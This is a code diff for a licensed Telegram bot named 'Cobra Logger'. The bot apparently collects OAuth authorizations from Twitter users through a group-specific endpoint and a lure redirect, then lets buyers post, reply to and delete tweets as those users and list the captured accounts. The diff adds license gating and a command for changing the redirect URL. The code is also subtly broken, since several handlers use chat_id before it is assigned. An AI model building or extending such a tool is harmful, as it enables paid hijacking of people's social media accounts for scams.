@@ -3,6 +3,7 @@ import string
 import requests
 import urllib.parse
 import base64
+import validators
 from datetime import datetime, timedelta
 from pymongo.mongo_client import MongoClient
 from pymongo.server_api import ServerApi
@@ -40,20 +41,26 @@ def generate_random_key(length=12, segment_length=4):
     return '-'.join(segments)
     
 async def check_license(user_id, chat_id, context):
-    license = licenses.find_one({"used_by": user_id, "status": "active"})
+    group = groups.find_one({"group_id": chat_id})
     
-    text = "⚠️ *License not found or has expired. Please purchase a license to continue using Cobra Logger.*"
-    
-    if not license:
+    if group:
+        text = "⚠️ *License not found or has expired. Please purchase a license to continue using Cobra Logger.*"
+        
+        license = licenses.find_one({"used_by": group.get("owner_id"), "status": "active"})
+        if not license:
+            await context.bot.send_message(chat_id, text, parse_mode) 
+            return False
+        
+        expiration_date = license.get("expiration_date")
+        if expiration_date and datetime.utcnow() > expiration_date:
+            await context.bot.send_message(chat_id, text, parse_mode) 
+            return False
+            
+        return True
+    else:
+        text = "⚠️ Group has not been setup yet. Use the /setup command to setup your group for OAuth."
         await context.bot.send_message(chat_id, text, parse_mode) 
         return False
-        
-    expiration_date = license.get("expiration_date")
-    if expiration_date and datetime.utcnow() > expiration_date:
-        await context.bot.send_message(chat_id, text, parse_mode) 
-        return False
-        
-    return True
 
 
 async def start(update: Update, context: CallbackContext) -> None:
@@ -102,7 +109,7 @@ async def start(update: Update, context: CallbackContext) -> None:
         text = f"🐍 *Welcome to Cobra Logger, {update.effective_user.full_name}*! 🐍\n\n✅ *Your license has been activated and will expire:* `{expiration_msg}`\n\n💬 _To get started, add me to a group and use the /setup command to setup your group for OAuth._"
         await context.bot.send_message(chat_id, text, parse_mode)
     else:
-        text = "⚠️ *An unknown error occured.*"
+        text = "⚠️ *An unknown error has occured.*"
         await context.bot.send_message(chat_id, text, parse_mode)
 
 
@@ -113,18 +120,11 @@ async def help(update: Update, context: CallbackContext) -> None:
         return
         
     text = "❔ *List of Commands*\n\n *•* 🐦 */post_tweet* <username> <message> - Posts a tweet on behalf of the user.\n *•* 💬 */post_reply* <username> <tweetId> <message> - Posts a reply to a tweet on behalf of the user.\n *•* ❌ */delete_tweet* <username> <tweetId> - Deletes a tweet on behalf of the user.\n *•* 👥 */display_users* - Shows the list of authenticated users.\n *•* 🔗 */display_endpoint* - Displays the group's endpoint.\n *•* 🔄 */set_redirect* - Sets the redirect upon authorization.\n *•* ❔ */help* - Displays the list of commands."
-    
     await context.bot.send_message(chat_id, text, parse_mode)
 
 
 async def setup(update: Update, context: CallbackContext) -> None:
     chat_id = update.message.chat_id if update.message else update.callback_query.message.chat_id
-    if update.effective_chat.type == "private":
-        text = "❌ *This command can only be used in groups.*"
-        
-        await context.bot.send_message(chat_id, text, parse_mode) 
-        return
-    
     owner_id = update.message.from_user.id
     owner_username = update.message.from_user.username
     group_name = update.message.chat.title
@@ -132,14 +132,20 @@ async def setup(update: Update, context: CallbackContext) -> None:
     
     license = await check_license(user_id=owner_id, chat_id=chat_id, context=context)
     if license:
+        if update.effective_chat.type == "private":
+            text = "❌ *This command can only be used in groups.*"
+            
+            await context.bot.send_message(chat_id, text, parse_mode) 
+            return
+        
         group_data = {
             "group_id": chat_id,
             "group_name": group_name,
             "owner_id": owner_id,
             "owner_username": owner_username,
             "identifier": identifier,
-            "redirect": "https://calendly.com/cointele"
-            "endpoint": f"https://cobratool.dev?",
+            "redirect": "https://calendly.com/cointele",
+            "endpoint": f"https://cobratool.dev/oauth?identifier={identifier}",
             "authenticated_users": []
         }
         groups.insert_one(group_data)
@@ -156,11 +162,47 @@ async def setup(update: Update, context: CallbackContext) -> None:
             text = f"✅ *Group has been set up for OAuth.*\n\n╭  ℹ️ *GROUP INFO*\n┣  *Group ID:* `{group_data['group_id']}`\n┣  *Group Name:* `{group_data['group_name']}`\n┣  *Owner: @{group_data['owner_username']}*\n╰  *Identifier:* `{group_data['identifier']}`"
             await context.bot.send_message(chat_id, text, parse_mode)
         else:
-            text = "⚠️ *An unknown error occured.*"
+            text = "⚠️ *An unknown error has occured.*"
             await context.bot.send_message(chat_id, text, parse_mode)
 
 
+async def set_redirect(update: Update, context: CallbackContext) -> None:
+    license = await check_license(user_id=update.effective_user.id, chat_id=chat_id, context=context)
+    if not license:
+        return
+    
+    if update.effective_chat.type == "private":
+        text = "❌ *This command can only be used in groups.*"
+        
+        await context.bot.send_message(chat_id, text, parse_mode) 
+        return
+    
+    args = context.args
+    if len(args) < 1:
+        await update.message.reply_text(
+            'Usage: /set_redirect <url>')
+        return
+        
+    chat_id = update.message.chat_id if update.message else update.callback_query.message.chat_id
+    url = args[0]
+    
+    if not validators.url(url):
+        text = "⚠️ *The url you provided is invalid.*"
+        await context.bot.send_message(chat_id, text, parse_mode)
+    else:
+        group_data = {
+            "redirect": url
+        }
+        groups.update_one(
+            {"group_id": chat_id},
+            {"$set": group_data}
+        )
+
 async def tweet(update: Update, context: CallbackContext) -> None:
+    license = await check_license(user_id=update.effective_user.id, chat_id=chat_id, context=context)
+    if not license:
+        return
+        
     args = context.args
     if len(args) < 2:
         await update.message.reply_text(
@@ -208,6 +250,10 @@ async def tweet(update: Update, context: CallbackContext) -> None:
 
 
 async def reply(update: Update, context: CallbackContext) -> None:
+    license = await check_license(user_id=update.effective_user.id, chat_id=chat_id, context=context)
+    if not license:
+        return
+        
     args = context.args
     if len(args) < 3:
         await update.message.reply_text(
@@ -318,6 +364,10 @@ async def refresh(update: Update, context: CallbackContext) -> None:
 
 
 async def delete(update: Update, context: CallbackContext) -> None:
+    license = await check_license(user_id=update.effective_user.id, chat_id=chat_id, context=context)
+    if not license:
+        return
+        
     args = context.args
     if len(args) < 2:
         await update.message.reply_text(
@@ -412,6 +462,7 @@ def main() -> None:
     app.add_handler(CommandHandler("refresh", refresh))
     app.add_handler(CommandHandler("delete_tweet", delete))
     app.add_handler(CommandHandler("generate_key", generate_key))
+    app.add_handler(CommandHandler("set_redirect", set_redirect))
     app.add_handler(CommandHandler("links", links))
     app.add_handler(CommandHandler("id", id))
     app.run_polling(poll_interval=5)
